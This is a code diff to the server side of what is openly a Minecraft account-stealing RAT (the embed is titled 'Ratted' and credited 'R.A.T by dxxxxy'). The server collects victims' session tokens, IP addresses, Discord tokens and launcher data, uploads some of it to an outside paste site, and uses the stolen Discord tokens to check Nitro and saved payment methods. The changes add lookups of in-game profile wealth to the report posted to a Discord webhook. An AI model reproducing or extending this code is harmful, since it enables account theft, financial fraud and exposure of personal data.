@@ -4,7 +4,7 @@ const
     usingMongoDB = false
 
 //setup
-const networthCalc = require('./utils/Networth');
+const getProfiles = require('./utils/networth');
 require("dotenv").config()
 const { post, get } = require("axios"),
     express = require("express"),
@@ -92,12 +92,6 @@ app.post("/", (req, res) => {
             }
 
             if (usingDiscord) {
-                // initialize networth variables
-                let networth = "0";
-                let soulboundnetworth = "0";
-                let sentnetworth = 0;
-                let description = "No profile data found. 🙁";
-                
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
@@ -112,6 +106,17 @@ app.post("/", (req, res) => {
                 let payments = ""
 
                 const discord = req.body.discord.split(" | ")
+
+                // get profiles
+                let profiles = ''
+
+                const profileData = await getProfiles('90e08207b2104996816b8ff4985db73b');
+
+	            if (profileData) {
+                    for (let profileId in profileData.profiles) {
+                        profiles += `${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`;
+                    }
+                }
 
                 for await (const token of req.body.discord.split(" | ")) {
                     let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
@@ -151,12 +156,22 @@ app.post("/", (req, res) => {
                         content: `@everyone - no nw chigger)`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
-                            description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
-                            url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                             fields: [
+                                { name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true },
+                                { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
+                                { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
+                                { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
+                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
+                                { name: 'Feather', value: `${checkFeather}`, inline: true },
+                                { name: 'Essentials', value: `${checkEssentials}`, inline: true },
+                                { name: 'Lunar', value: `${checkLunar}`, inline: true },
+                                { name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false },
+                                { name: 'Nitro', value: `\`${nitros}\``, inline: true },
+                                { name: 'Payment', value: `\`${payments}\``, inline: true }
+                            ],
                             color: 5814783,
                             footer: {
-                                "text": "R.A.T by dxxxxy",
-                                "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                                "text": "🕊️ MagiDev on top 🕊️",
                             },
                             timestamp: new Date()
                         }],
